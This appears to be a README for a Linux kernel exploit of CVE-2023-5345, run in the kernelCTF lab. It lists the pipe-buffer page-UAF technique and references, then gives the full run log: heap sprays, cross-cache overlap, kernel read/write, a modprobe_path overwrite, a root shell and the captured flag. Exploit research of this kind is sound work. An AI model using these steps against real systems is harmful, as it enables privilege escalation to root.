
# CVE-2023-5345

Pipe-Primtive to Page-UAF.

Test env: kernelCTF lts-6.1.52

Refer:
- https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2023-5345_lts_mitigation
- https://github.com/XiaozaYa/DCO
- https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/
- https://www.interruptlabs.co.uk/articles/pipe-buffer
- https://github.com/google/security-research/tree/master/pocs/linux/kernelctf/CVE-2024-41010_lts
- https://github.com/Notselwyn/CVE-2024-1086
- https://docs.kernel.org/arch/x86/x86_64/mm.html

Exp üçª:
```
user@lts-6:/tmp$ ./exp
./exp
[*] Draining kmalloc-96...
[*] Spraying pre kmalloc-96 objs...
[   48.501853] CIFS: VFS: smb3_fs_context_parse_param: Invalid max_credits value
[*] Spraying post kmalloc-96 objs...
[*] Freeing pre/post kmalloc-96 objs around victim...
[*] Spraying cross-cache kmalloc-cg-192 msg_msg...
[*] Freeing corrupted key...
[*] Spraying kmalloc-cg-192 pipe_buffers...
[*] Spraying pages to pipe_buffers...
[*] Checking unaligned overlap...
[*] Overlap data:
    0000  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0020  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0040  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[-] Overlap at start (msg_msg idx: 57)
[-] Not found unaligned overlap!
[-] Waiting for retrying...
[-] Retry again...
[*] Draining kmalloc-96...
[*] Spraying pre kmalloc-96 objs...
[   53.565298] CIFS: VFS: smb3_fs_context_parse_param: Invalid max_credits value
[*] Spraying post kmalloc-96 objs...
[*] Freeing pre/post kmalloc-96 objs around victim...
[*] Spraying cross-cache kmalloc-cg-192 msg_msg...
[*] Freeing corrupted key...
[*] Spraying kmalloc-cg-192 pipe_buffers...
[*] Spraying pages to pipe_buffers...
[*] Checking unaligned overlap...
[*] Overlap data:
    0000  0x0000000000000039  0x4141414141414141  0x4141414141414141  0x4141414141414141   9.......AAAAAAAAAAAAAAAAAAAAAAAA
    0020  0x4141414141414141  0x4141414141414141  0xffffc7be441f1a80  0x0000002800000000   AAAAAAAAAAAAAAAA...D........(...
    0040  0xffffffff90a1d780  0x0000000000000010  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[*] Overlap msg_msg idx: 57
[*] Freeing overlap msg_msg...
[*] Spraying msg_msg to overwrite pipe_buffer...
[*] Overwrite data:
    0000  0x00000000deadbeef  0x4141414141414141  0x4141414141414141  0x4141414141414141   ........AAAAAAAAAAAAAAAAAAAAAAAA
    0020  0x4141414141414141  0x4141414141414141  0xffffc7be441f1a00  0x0000002800000000   AAAAAAAAAAAAAAAA...D........(...
    0040  0xffffffff90a1d780  0x0000000000000010  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[*] Got 1st corrupted pipe_buffers (orig: 1, victim: 3)
[*] Padding pipe_buffers[victim] to 96*2...
[*] Close pipe_buffers[orig] to free the page...
[*] Spraying pipe_buffers (size: 2*40) on 1st victim page...
[*] Got a pipe_buffer (page: 0xffffc7be441f2e00, ops: 0xffffffff90a1d780)
[*] Trying to get 2nd victim page...
[*] Got 2nd corrupted pipe_buffers (orig: 81, victim: 47)
[*] Close pipe_buffers[snd_orig] to free the page...
[*] Spraying pipe_buffers (size: 4*40) on 2nd victim page...
[*] Hijacking 3rd pipe_buffer1.page to 2nd victim page...
[*] Finding 3rd corrupted pipe_buffer1...
[*] Got 3rd corrupted pipe_buffer1 (pbid: 159)
[*] Hijacking 3rd pipe_buffer2.page to 2nd victim page...
[*] Finding 3rd corrupted pipe_buffer2...
[*] Got 3rd corrupted pipe_buffer2 (pbid: 178)
[*] Hijacking 3rd pipe_buffer3.page to 2nd victim page...
[*] Finding 3rd corrupted pipe_buffer3...
[*] Got 3rd corrupted pipe_buffer3 (pbid: 168)
[*] Setting up kenrel arbitrary read/write...
[*] Finding kernel base vmemmap offset...
[*] Trying page: 0xffffc7be40480000 (kernel_base: 0x480000)
[*] Found kernel base vmemmap offset: 0x480000
[*] Scanning kernel memory...
[*] Scanning 0xffffc7be4050ca00, 35MB
[*] Found modprobe_path at page: 0xffffc7be40519dc0 (offset: 0x4a0)
[   57.342574] process 'exp' launched '/dev/fd/1009' with NULL argv: empty string added
/bin/sh: 0: can't access tty; job control turned off
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /flag
cat /flag
kernelCTF{deprecated:v1:lts-6.1.52:1743568646:30c4b770de549f472549d0c70715521429903b4b}
```
